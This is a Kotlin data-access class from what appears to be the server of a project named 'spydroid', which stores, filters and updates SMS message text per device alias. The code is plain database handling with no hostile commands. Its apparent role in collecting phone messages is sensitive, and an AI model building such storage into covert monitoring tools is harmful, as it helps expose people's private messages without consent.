/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.server.db.data

import net.spydroid.server.db.entities.Sms
import net.spydroid.server.db.domain.SmsDao
import net.spydroid.server.models.SmsHandler
import org.jetbrains.exposed.sql.insert
import org.jetbrains.exposed.sql.select
import org.jetbrains.exposed.sql.selectAll
import org.jetbrains.exposed.sql.transactions.transaction
import org.jetbrains.exposed.sql.update

class SmsDaoHandler : SmsDao {
    override suspend fun getSms(): List<SmsHandler> =
        transaction {
            Sms.selectAll().map {
                SmsHandler(
                    id = it[Sms.id],
                    alias = it[Sms.alias],
                    sms = it[Sms.sms]
                )
            }
        }

    override suspend fun filerWithAlias(alias: String): List<SmsHandler> =
        transaction {
            Sms.select { Sms.alias eq alias }.map {
                SmsHandler(
                    id = it[Sms.id],
                    alias = it[Sms.alias],
                    sms = it[Sms.sms]
                )
            }
        }

    override suspend fun insert(sms: SmsHandler) {
        try {
            transaction {
                Sms.insert {
                    it[Sms.sms] = sms.sms
                    it[Sms.alias] = sms.alias
                }
            }
        }catch (e: Exception) {
            println("❌ Error al insertar el dispositivo: ${e.message}")
            throw e
        }
    }

    override suspend fun update(sms: SmsHandler) =
        try {
            transaction {
                val updatedRows = Sms.update({ Sms.alias eq sms.alias }) {
                    it[Sms.alias] = sms.alias
                    it[Sms.sms] = sms.sms
                }

                if (updatedRows == 0) {
                    println("❌ No se encontró un mensaje con el alias ${sms.alias} para actualizar.")
                    throw Exception("Device not found")
                } else {
                    println("🔄 Mensaje con el alias: ${sms.alias} actualizado correctamente.")
                }
            }
        } catch (e: Exception) {
            throw e
        }

    override suspend fun delete(sms: SmsHandler) {
        TODO("Not yet implemented")
    }
}